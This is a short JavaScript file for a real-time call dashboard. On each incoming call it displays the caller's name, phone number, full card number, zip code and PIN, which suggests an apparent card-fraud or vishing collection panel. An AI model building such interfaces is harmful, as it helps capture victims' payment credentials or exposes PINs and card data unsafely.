
document.addEventListener("DOMContentLoaded", function () {
    const socket = io.connect(window.location.origin);

    // Ringtone setup
    const ringtone = new Audio("https://www.soundjay.com/button/beep-07.wav");

    // Listen for real-time updates
    socket.on("update_dashboard", function(data) {
        document.getElementById("customer-name").textContent = data.customer_name || "Waiting...";
        document.getElementById("phone-number").textContent = data.phone_number || "Waiting...";
        document.getElementById("card-number").textContent = data.card_number || "Waiting...";
        document.getElementById("zip-code").textContent = data.zip_code || "Waiting...";
        document.getElementById("pin").textContent = data.pin || "Waiting...";

        // If an incoming call is detected, play ringtone and show alert
        if (data.phone_number && data.phone_number !== "Waiting...") {
            ringtone.play();
            alert("Incoming Call from " + data.phone_number);
        }
    });

    // Function to save customer notes
    function saveNotes() {
        const notes = document.getElementById("customer-notes").value;
        localStorage.setItem("customerNotes", notes);
        alert("Notes saved!");
    }

    // Load saved notes
    document.getElementById("customer-notes").value = localStorage.getItem("customerNotes") || "";
});
